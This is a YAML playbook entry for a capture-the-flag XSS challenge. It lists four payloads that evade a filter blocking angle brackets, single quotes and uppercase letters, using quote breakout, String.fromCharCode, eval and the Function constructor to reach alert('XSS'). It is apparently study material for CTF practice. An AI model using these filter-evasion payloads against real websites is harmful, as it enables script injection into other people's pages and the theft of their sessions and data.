name: xss_strict_filter_bypass
category: web
tags: [xss, filter_bypass, javascript, unicode]
indicators:
  - "XSS filter blocks < > ' and uppercase"
  - "Need to execute alert('XSS')"
  - "PhantomJS checks for XSS execution"
  - "String concatenation in JavaScript"

tricks:
  - name: "Step 1: Identify XSS filter"
    when: "Found XSS challenge"
    how: "Test what characters are blocked"
    payload: |
      # Blacklist: < > ' and uppercase letters
      # Need: alert('XSS')

  - name: "Step 2: Bypass uppercase restriction"
    when: "Uppercase letters blocked"
    how: "Use String.fromCharCode()"
    payload: |
      ";alert(String.fromCharCode(88,83,83));//
      # 88=X, 83=S, 83=S

  - name: "Step 3: Alternative encoding"
    when: "String.fromCharCode doesn't work"
    how: "Use eval with encoded string"
    payload: |
      ";eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41));//
      # Encodes: alert('XSS')

  - name: "Step 4: Function constructor"
    when: "Other methods blocked"
    how: "Use constructor to create function"
    payload: |
      ";[]["constructor"]["constructor"]("alert(String.fromCharCode(88,83,83))")();//

